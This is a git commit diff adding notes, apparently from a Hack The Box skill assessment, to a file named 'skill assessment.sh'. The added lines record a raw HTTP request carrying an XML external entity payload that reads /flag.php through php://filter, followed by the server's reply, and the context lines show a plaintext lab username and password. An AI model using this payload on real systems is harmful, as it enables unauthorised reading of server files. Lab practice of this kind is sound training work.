45eac2d949051a2150670f7367ee28c06735350c
George Jeoung (Euyin) <justice2638@hotmail.com>
2025-06-25 03:42:25 +0000

    Update skill assessment.sh

--- skill assessment.sh
+++ skill assessment.sh
@@ -10,3 +10,42 @@ echo "Admin Token: $ADMIN_TOKEN"
 ID :a.corrales
 PW : 123
 CHANGED
+
+
+
+GET /addEvent.php HTTP/1.1
+Host: 94.237.55.43:50149
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Cookie: uid=52; PHPSESSID=bocot3db837kihk7djlhfc3vr2
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Content-Length: 135
+
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php" >
+]>
+<root>
+<name>&xxe;</name>
+</root>
+
+
+
+
+HTTP/1.1 200 OK
+Date: Wed, 25 Jun 2025 03:39:50 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 86
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Event 'htb{123}' has been created.
